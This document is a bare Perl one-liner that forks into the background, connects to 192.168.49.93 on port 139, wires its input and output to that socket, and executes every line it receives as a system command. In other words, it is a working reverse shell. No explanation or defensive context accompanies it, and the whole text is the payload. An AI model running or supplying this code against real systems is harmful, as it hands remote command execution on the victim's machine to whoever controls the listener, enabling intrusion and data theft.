$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.49.93:139");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;
